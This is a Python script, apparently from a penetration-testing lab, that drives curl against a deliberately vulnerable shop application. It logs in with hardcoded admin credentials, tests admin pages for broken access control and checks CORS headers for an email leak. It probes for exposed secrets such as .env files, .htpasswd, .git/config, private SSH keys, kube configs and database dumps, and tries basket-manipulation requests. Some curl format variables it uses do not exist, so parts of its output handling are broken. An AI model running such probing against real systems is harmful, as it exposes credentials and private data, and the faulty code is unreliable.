import subprocess, json, time

base = "http://lab-mutator:3000"
token = None


def get_admin():
    global token
    if token:
        return token
    out = subprocess.run(
        ["curl", "-s", "-X", "POST", base + "/rest/user/login",
         "-H", "Content-Type:application/json",
         "-d", json.dumps({"email": "adminhacker@x.com", "password": "AdminPass123!", "rememberMe": False})],
        capture_output=True, text=True).stdout
    token = json.loads(out)["authentication"]["token"]
    return token


def req(method, path, hdrs=None, data=None):
    cmd = ["curl", "-s"] + (["-X", method] if method != "GET" else [])
    hdrs = dict(hdrs or {})
    hdrs["Authorization"] = "Bearer " + get_admin()
    for k, v in hdrs.items():
        cmd += ["-H", k + ":" + v]
    if data:
        cmd += ["-H", "Content-Type:application/json", "-d", data]
    cmd += [base + path]
    r = subprocess.run(cmd, capture_output=True, text=True)
    return r.returncode, r.stdout.strip(), r.stderr.strip()


def head(path):
    r = subprocess.run(["curl", "-s", "-o", "/dev/null", "-w",
                        "%{http_code}:%{http_size}:%{http_content_type}", base + path],
                       capture_output=True, text=True)
    return r.stdout.strip()


print("=== CORS headers on /api/Products (id=24 email leak) ===")
r = subprocess.run(["curl", "-s", "-D", "/tmp/cors_hdr", base + "/api/Products/"], capture_output=True, text=True)
print(open("/tmp/cors_hdr").read()[:800])

print("\n=== /admin without JWT (id=5 BAC check) ===")
for m, p in [("GET", "/admin"), ("GET", "/admin/"), ("GET", "/admin/dashboard")]:
    rc, out, err = req(m, p)
    print(f"{m} {p:25} code={rc} {out[:50].replace(chr(10),' ')}")

print("\n=== static file probes (first 40 of /assets) ===")
candidates = [
    "assets/i18n/en.json","assets/i18n/de.json","assets/i18n/fr.json","assets/i18n/es.json",
    "assets/i18n/pt.json","assets/i18n/nl.json","assets/i18n/it.json","assets/i18n/ja.json",
    "assets/i18n/ko.json","assets/i18n/ru.json","assets/i18n/zh.json","assets/i18n/zh-TW.json",
    "assets/i18n/ar.json","assets/i18n/cs.json","assets/i18n/da.json","assets/i18n/el.json",
    "assets/i18n/fi.json","assets/i18n/hu.json","assets/i18n/pl.json","assets/i18n/ro.json",
    "assets/i18n/sv.json","assets/i18n/tr.json","assets/i18n/uk.json","assets/i18n/vi.json",
    "assets/i18n/no.json","assets/i18n/sk.json","assets/i18n/th.json","assets/i18n/hi.json",
    "assets/public/.htpasswd","assets/public/.htaccess","assets/public/.git","assets/public/.env",
    "assets/public/sigma.yml","assets/public/sig.yml","assets/public/sig*.yml","assets/public/sigma",
    "assets/public/terraform.tf","assets/public/terraform.tfvars","assets/public/k8s.yaml",
    "assets/public/kubernetes.yaml","assets/public/docker-compose.yml","assets/public/docker-compose.yaml",
    "assets/public/Makefile","assets/public/README.md","assets/public/LICENSE","assets/public/CHANGELOG.md",
    "assets/public/blueprint.pdf","assets/public/blueprint","assets/public/drawings/blueprint.pdf",
    "assets/public/backups/db.sql","assets/public/backups/backup.sql","assets/public/backup.sql",
    "assets/public/.sql","assets/public/data.sql","assets/public/dump.sql","assets/public/export.sql",
    "assets/public/.terraform.lock.hcl","assets/public/.kube/config","assets/public/id_rsa",
    "assets/public/id_rsa.pub","assets/public/config.json","assets/public/appsettings.json",
    ".htpasswd",".htaccess",".env",".git/config",".sql","db.sql","backup.sql","dumps",
    "ftp/legal.md","swagger.json","swagger.yaml","openapi.json","api-docs","documentation",
    "assets/js/i18n/en.json","assets/js/i18n/de.json","assets/public/images/.env","assets/public/fonts/.env",
]
for p in candidates[:40]:
    sig = head(p)
    code, size, ctype = sig.split(":")
    real = "REAL " if code == "200" and not size == "9393" else "shll"
    print(f"{real:4} {p:45} {sig}")

print("\n=== basket manipulation API ===")
for m, p, d in [
    ("GET", "/rest/basket/1/products/1/quantity", None),
    ("POST", "/rest/basket/1/products/1/quantity", '{"quantity": 5}'),
    ("PUT", "/rest/basket/1/products/1/quantity", '{"quantity": 5}'),
    ("POST", "/rest/basket/1", '{"productId": 1, "quantity": 1}'),
    ("GET", "/rest/user/basket", None),
]:
    rc, out, err = req(m, p, data=d)
    print(f"{m} {p:40} code={rc} {out[:70].replace(chr(10),' ')}")
